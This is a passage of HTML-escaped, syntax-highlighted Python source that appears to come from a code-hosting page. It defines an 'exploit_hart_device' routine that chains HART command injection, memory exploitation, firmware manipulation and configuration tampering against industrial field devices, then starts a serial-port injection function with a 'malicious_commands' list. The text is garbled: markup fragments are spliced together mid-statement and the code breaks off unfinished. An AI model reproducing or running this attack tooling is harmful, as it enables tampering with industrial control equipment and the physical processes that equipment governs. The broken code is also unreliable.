class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003einterface\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003einterface\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ehart_commands\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eload_hart_command_set\u003c/span\u003e()\n        \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003edevice_profiles\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eload_hart_device_profiles\u003c/span\u003e()\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003eexploit_hart_device\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003etarget_device\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Execute comprehensive HART device exploitation across multiple attack vectors.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Combines command injection, memory manipulation, and firmware attacks for complete device compromise.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003eexploitation_results\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e {}\n        \n        \u003cspan class=\"pl-c\"\u003e# Phase 1: HART Command Injection\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003eexploitation_results\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'command_injection'\u003c/span\u003e] \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ehart_command_injection\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003etarget_device\u003c/span\u003e)\n        \n        \u003cspan class=\"pl-c\"\u003e# Phase 2: Memory Manipulation and Exploitation\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003eexploitation_results\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'memory_exploitation'\u003c/span\u003e] \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ehart_memory_exploitation\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003etarget_device\u003c/span\u003e)\n        \n        \u003cspan class=\"pl-c\"\u003e# Phase 3: Firmware Analysis and Manipulation\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003eexploitation_results\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'firmware_exploitation'\u003c/span\u003e] \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ehart_firmware_exploitation\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003etarget_device\u003c/span\u003e)\n        \n        \u003cspan class=\"pl-c\"\u003e# Phase 4: Device Configuration Tampering\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003eexploitation_results\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'configuration_tampering'\u003c/span\u003e] \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ehart_configuration_tampering\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003etarget_device\u003c/span\u003e)\n        \n        \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eexploitation_results\u003c/span\u003e\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003ehart_command_injection\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003edevice\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Execute HART command injection attacks to manipulate device behavior.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Uses legitimate HART commands with malicious parameters for device control.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-k\"\u003eimport\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eserial\u003c/span\u003e\n        \u003cspan class=\"pl-k\"\u003eimport\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003etime\u003c/span\u003e\n        \n        \u003cspan class=\"pl-c\"\u003e# Initialize HART modem interface (1200 baud FSK)\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003eser\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eserial\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eSerial\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003einterface\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e1200\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003ebytesize\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e7\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003eparity\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e'E'\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003estopbits\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e1\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003etimeout\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e2\u003c/span\u003e)\n        \n        \u003cspan class=\"pl-c\"\u003e# HART command frame structure (HCF SPEC-13):\u003c/span\u003e\n        \u003cspan class=\"pl-c\"\u003e# Byte 0: Delimiter (0x82 = long frame with 2 expansion bytes)\u003c/span\u003e\n        \u003cspan class=\"pl-c\"\u003e# Byte 1: Command code\u003c/span\u003e\n        \u003cspan class=\"pl-c\"\u003e# Following bytes: Command data\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003emalicious_commands\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e [\n            \u003cspan class=\"pl-c\"\u003e# Command 6: Write Primary Variable - class=\"pl-s1\"\u003eresponse\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eser\u003c/span\u003e.\u003cspan class=\"pl-s\"\u003e'command'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003ecmd\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ehex\u003c/span\u003e(),\n                    \u003cspan class=\"pl-c1\"\u003eNone\u003c/span\u003e\n                })\n                \n                \u003cspan class=\"pl-k\"\u003eif\u003c/span\u003e \u003cspan
